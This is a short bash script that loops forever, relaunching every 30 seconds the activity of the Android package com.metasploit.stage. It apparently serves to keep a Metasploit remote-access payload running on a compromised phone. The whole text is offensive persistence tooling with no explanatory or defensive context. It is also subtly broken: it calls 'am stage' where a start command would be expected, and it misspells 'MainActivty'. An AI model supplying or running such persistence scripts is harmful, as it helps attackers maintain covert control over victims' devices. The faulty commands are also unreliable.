#!/bin/bash
while :
do am stage --user 0 -a android.intent.action.MAIN -n
com.metasploit.stage/.MainActivty
sleep 30
done
